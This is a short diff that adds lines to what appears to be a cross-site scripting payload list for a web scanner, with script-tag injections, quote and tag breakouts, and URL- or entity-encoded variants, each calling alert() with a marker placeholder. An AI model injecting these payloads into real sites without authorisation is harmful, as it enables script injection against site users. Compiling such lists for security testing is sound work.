@@ -1,3 +1,15 @@
 <script>alert("[randmark]")</script>
 "><script>alert("[randmark]")</script>
 </textarea><script>alert("[randmark]")</script>
+<script>alert("[randmark]")</script>
+<<script>alert("[randmark]");//<</script>
+<script>alert("[randmark]")</script>
+'><script>alert("[randmark]")</script>
+'><script>alert("[randmark]");</script>
+\";alert("[randmark]");//
+%3cscript%3ealert("[randmark]");%3c/script%3e
+%3cscript%3ealert("[randmark]");%3c%2fscript%3e
+%3Cscript%3Ealert("[randmark]");%3C/script%3E
+&ltscript&gtalert("[randmark]");</script>
+&ltscript&gtalert("[randmark]");&ltscript&gtalert
+<xss><script>alert("[randmark]")</script></vulnerable>
